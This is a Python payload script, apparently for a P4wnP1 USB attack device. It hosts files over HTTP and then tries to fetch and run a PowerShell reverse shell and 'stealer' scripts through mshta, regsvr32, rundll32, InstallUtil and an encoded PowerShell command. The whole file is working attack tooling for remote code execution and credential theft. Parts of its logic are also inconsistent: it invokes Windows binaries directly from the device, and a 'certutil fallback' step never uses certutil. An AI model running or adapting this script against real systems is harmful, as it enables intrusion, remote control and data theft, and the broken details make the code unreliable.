# File: /opt/p4wnp1/payloads/hid/autorun_powershell.py
import subprocess
import socket
import fcntl
import struct
import os
import base64
import http.server
import socketserver
import threading
import time

# Serve payloads in memory from this directory
PAYLOAD_DIR = "/opt/p4wnp1/payloads/hid/memory_hosted"
PAYLOAD_PORT = 8000


class SilentHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass


def get_usb_ip(interface="usb0"):
    fallback_ip = "10.13.37.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', interface.encode('utf-8')[:15]))
        return socket.inet_ntoa(ip[20:24])
    except Exception:
        return fallback_ip


# Temporary HTTP server for serving payloads
class OneShotHTTP:
    def __init__(self, path, port):
        self.path = path
        self.port = port
        self.httpd = None
        self.thread = None

    def start(self):
        os.chdir(self.path)
        handler = SilentHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"[*] Hosting payloads on port {self.port}")

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            print("[*] Payload server stopped")


# Get host IP to serve from
host_ip = get_usb_ip()
payload_url = f"http://{host_ip}:{PAYLOAD_PORT}"

print(f"[*] Host IP: {host_ip}")

# Start hosting payloads in background
server = OneShotHTTP(PAYLOAD_DIR, PAYLOAD_PORT)
server.start()
time.sleep(1)

# PowerShell in-memory encoded reverse shell
powershell_script = f"IEX(New-Object Net.WebClient).DownloadString('{payload_url}/reverse.ps1')"
encoded_payload = subprocess.check_output([
    "powershell",
    "-NoProfile",
    "-Command",
    f"[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"{powershell_script}\"))"
]).decode().strip()

# === LOLBINS attempts ===
print("[*] Trying mshta...")
try:
    subprocess.run(["mshta", f"{payload_url}/stealer.vbs"], check=True)
    exit(0)
except Exception:
    print("[!] mshta failed")

print("[*] Trying regsvr32...")
try:
    subprocess.run(["regsvr32", "/s", "/n", "/u", "/i:{}".format(f"{payload_url}/stealer.sct"), "scrobj.dll"], check=True)
    exit(0)
except Exception:
    print("[!] regsvr32 failed")

print("[*] Trying rundll32...")
try:
    rundll_payload = f"javascript:" + "\"\"" + f"\"eval(new ActiveXObject('WScript.Shell').Run('powershell -EncodedCommand {encoded_payload}'))\""
    subprocess.run(["rundll32.exe", "javascript:.", rundll_payload], check=True)
    exit(0)
except Exception:
    print("[!] rundll32 failed")

print("[*] Trying InstallUtil...")
try:
    dummy_assembly = os.path.join(os.getenv("TEMP", "/tmp"), "FakeAssembly.exe")
    subprocess.run(["InstallUtil.exe", dummy_assembly], check=True)
    exit(0)
except Exception:
    print("[!] InstallUtil failed")

print("[*] Trying certutil fallback...")
try:
    subprocess.run(["powershell", "-NoProfile", "-EncodedCommand", encoded_payload], check=True)
    exit(0)
except Exception as e:
    print(f"[!] Encoded fallback failed: {e}")

# Wait before shutdown
time.sleep(120)
server.stop()

# End of autorun_powershell.py
